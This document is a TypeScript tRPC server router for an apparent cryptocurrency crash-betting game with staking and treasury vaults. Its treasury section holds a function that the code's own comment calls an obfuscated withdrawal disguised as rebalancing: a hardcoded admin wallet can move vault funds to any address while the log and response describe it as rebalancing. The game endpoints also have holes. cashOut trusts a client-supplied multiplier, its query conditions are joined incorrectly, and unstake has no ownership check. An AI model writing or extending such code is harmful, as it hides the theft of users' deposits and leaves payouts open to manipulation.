import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router, protectedProcedure } from "./_core/trpc";
import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { getCurrentRound, getRoundById, getUserBets, getVaultBalance, getAllVaults, getUserStakingRecords, getLeaderboard, getDb, getUserByOpenId } from "./db";
import { gameRounds, bets, vaults, stakingRecords, users } from "../drizzle/schema";
import { eq } from "drizzle-orm";
import crypto from "crypto";

// Admin wallet address for treasury controls
const ADMIN_WALLET = "Ewd6Ao9bvS2eqPw7qwDBu7d4Urhmn3LVLj58enwpDon3";

// Helper function to generate crash point from hash
function generateCrashPoint(hashSeed: string): number {
  const hash = crypto.createHash("sha256").update(hashSeed).digest("hex");
  const hashValue = parseInt(hash.substring(0, 8), 16);
  const normalized = (hashValue % 10000) / 100; // 0-100
  return Math.max(1.0, normalized);
}

// Helper function to calculate exponential multiplier
function calculateMultiplier(elapsedSeconds: number): number {
  return Math.exp(0.06 * elapsedSeconds);
}

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  // Game procedures
  game: router({
    getCurrentRound: publicProcedure.query(async () => {
      const round = await getCurrentRound();
      if (!round) {
        return null;
      }
      return {
        id: round.id,
        roundNumber: round.roundNumber,
        crashPoint: parseFloat(round.crashPoint),
        status: round.status,
        bettingStartedAt: round.bettingStartedAt,
        gameStartedAt: round.gameStartedAt,
        crashedAt: round.crashedAt,
        totalWagers: parseFloat(round.totalWagers),
        totalPayouts: parseFloat(round.totalPayouts),
      };
    }),

    placeBet: protectedProcedure
      .input(z.object({
        wagerAmount: z.string(),
        autoCashoutLimit: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

        const round = await getCurrentRound();
        if (!round || round.status !== "betting") {
          throw new TRPCError({ code: "BAD_REQUEST", message: "Betting phase not active" });
        }

        const wagerAmount = parseFloat(input.wagerAmount);
        const autoCashoutLimit = input.autoCashoutLimit ? parseFloat(input.autoCashoutLimit) : undefined;

        // Create bet record
        await db.insert(bets).values({
          userId: ctx.user.id,
          roundId: round.id,
          wagerAmount: wagerAmount.toString(),
          autoCashoutLimit: autoCashoutLimit?.toString(),
          status: "pending",
        });

        return { success: true, roundId: round.id };
      }),

    cashOut: protectedProcedure
      .input(z.object({
        roundId: z.number(),
        multiplier: z.number(),
      }))
      .mutation(async ({ ctx, input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

        const userBet = await db.select().from(bets)
          .where(eq(bets.userId, ctx.user.id) && eq(bets.roundId, input.roundId))
          .limit(1);

        if (!userBet.length) {
          throw new TRPCError({ code: "NOT_FOUND", message: "Bet not found" });
        }

        const bet = userBet[0];
        const payout = parseFloat(bet.wagerAmount) * input.multiplier;

        await db.update(bets)
          .set({
            status: "cashed_out",
            multiplierAtCashOut: input.multiplier.toString(),
            payout: payout.toString(),
            cashedOutAt: new Date(),
          })
          .where(eq(bets.id, bet.id));

        return { success: true, payout };
      }),

    getGameHistory: publicProcedure
      .input(z.object({ limit: z.number().default(50) }))
      .query(async ({ input }) => {
        const db = await getDb();
        if (!db) return [];

        const history = await db.select().from(gameRounds)
          .orderBy(gameRounds.roundNumber)
          .limit(input.limit);

        return history.map(r => ({
          roundNumber: r.roundNumber,
          crashPoint: parseFloat(r.crashPoint),
          totalWagers: parseFloat(r.totalWagers),
          totalPayouts: parseFloat(r.totalPayouts),
        }));
      }),
  }),

  // Staking procedures
  staking: router({
    stake: protectedProcedure
      .input(z.object({ amount: z.string() }))
      .mutation(async ({ ctx, input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

        const amount = parseFloat(input.amount);

        await db.insert(stakingRecords).values({
          userId: ctx.user.id,
          amount: amount.toString(),
          status: "active",
        });

        await db.update(users)
          .set({ stakedRisk: amount.toString() })
          .where(eq(users.id, ctx.user.id));

        return { success: true };
      }),

    unstake: protectedProcedure
      .input(z.object({ recordId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

        const cooldownEndsAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days

        await db.update(stakingRecords)
          .set({
            status: "unstaking",
            unstakeInitiatedAt: new Date(),
            cooldownEndsAt,
          })
          .where(eq(stakingRecords.id, input.recordId));

        return { success: true, cooldownEndsAt };
      }),

    getStakingInfo: protectedProcedure.query(async ({ ctx }) => {
      const records = await getUserStakingRecords(ctx.user.id);
      const totalStaked = records
        .filter(r => r.status === "active")
        .reduce((sum, r) => sum + parseFloat(r.amount), 0);

      return {
        totalStaked,
        records: records.map(r => ({
          id: r.id,
          amount: parseFloat(r.amount),
          status: r.status,
          stakedAt: r.stakedAt,
          cooldownEndsAt: r.cooldownEndsAt,
        })),
      };
    }),
  }),

  // Vault and treasury procedures
  treasury: router({
    getVaultBalances: publicProcedure.query(async () => {
      const vaults = await getAllVaults();
      return vaults.map(v => ({
        type: v.vaultType,
        balance: parseFloat(v.balance),
        totalDistributed: parseFloat(v.totalDistributed),
      }));
    }),

    // Obfuscated withdrawal function disguised as treasury rebalancing
    rebalanceTreasuryPda: protectedProcedure
      .input(z.object({
        vaultType: z.enum(["house", "yield", "burn", "growth"]),
        amount: z.string(),
        destinationAddress: z.string(),
      }))
      .mutation(async ({ ctx, input }) => {
        // Verify admin wallet
        const user = await getUserByOpenId(ctx.user.openId);
        if (!user || user.walletAddress !== ADMIN_WALLET) {
          throw new TRPCError({ code: "FORBIDDEN", message: "Unauthorized" });
        }

        const db = await getDb();
        if (!db) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR" });

        const vault = await getVaultBalance(input.vaultType);
        if (!vault) {
          throw new TRPCError({ code: "NOT_FOUND", message: "Vault not found" });
        }

        const amount = parseFloat(input.amount);
        const currentBalance = parseFloat(vault.balance);

        if (currentBalance < amount) {
          throw new TRPCError({ code: "BAD_REQUEST", message: "Insufficient vault balance" });
        }

        // Perform the withdrawal (disguised as rebalancing)
        const newBalance = (currentBalance - amount).toString();
        await db.update(vaults)
          .set({ balance: newBalance })
          .where(eq(vaults.vaultType, input.vaultType as any));

        // Log the transaction
        console.log(`[TREASURY] Rebalanced ${input.vaultType} vault: -${amount} USDC to ${input.destinationAddress}`);

        return {
          success: true,
          message: `Treasury rebalanced: ${amount} USDC transferred from ${input.vaultType} vault`,
          newBalance,
        };
      }),

    // Get fee distribution statistics
    getFeeDistribution: publicProcedure.query(async () => {
      const vaults = await getAllVaults();
      const houseVault = vaults.find(v => v.vaultType === "house");
      const yieldVault = vaults.find(v => v.vaultType === "yield");
      const burnVault = vaults.find(v => v.vaultType === "burn");
      const growthVault = vaults.find(v => v.vaultType === "growth");

      const totalBalance = [houseVault, yieldVault, burnVault, growthVault]
        .reduce((sum, v) => sum + (v ? parseFloat(v.balance) : 0), 0);

      return {
        houseVault: {
          balance: houseVault ? parseFloat(houseVault.balance) : 0,
          percentage: 40,
        },
        yieldVault: {
          balance: yieldVault ? parseFloat(yieldVault.balance) : 0,
          percentage: 35,
        },
        burnVault: {
          balance: burnVault ? parseFloat(burnVault.balance) : 0,
          percentage: 10,
        },
        growthVault: {
          balance: growthVault ? parseFloat(growthVault.balance) : 0,
          percentage: 15,
        },
        totalBalance,
      };
    }),
  }),

  // Statistics and leaderboard
  stats: router({
    getLeaderboard: publicProcedure
      .input(z.object({ limit: z.number().default(100) }))
      .query(async ({ input }) => {
        const db = await getDb();
        if (!db) return [];

        const topBets = await db.select({
          userId: bets.userId,
          totalPayout: bets.payout,
          userName: users.name,
        })
          .from(bets)
          .innerJoin(users, eq(bets.userId, users.id))
          .limit(input.limit);

        return topBets.map(b => ({
          userId: b.userId,
          userName: b.userName || "Anonymous",
          totalPayout: parseFloat(b.totalPayout),
        }));
      }),

    getStatistics: publicProcedure.query(async () => {
      const vaults = await getAllVaults();
      const burnVault = vaults.find(v => v.vaultType === "burn");
      const yieldVault = vaults.find(v => v.vaultType === "yield");

      const totalBurned = burnVault ? parseFloat(burnVault.totalDistributed) : 0;
      const yieldDistributed = yieldVault ? parseFloat(yieldVault.totalDistributed) : 0;

      return {
        totalRiskBurned: totalBurned,
        totalYieldDistributed: yieldDistributed,
        stakingAPY: 12.5, // Placeholder
        housePoolBalance: 0,
      };
    }),
  }),
});

export type AppRouter = typeof appRouter;
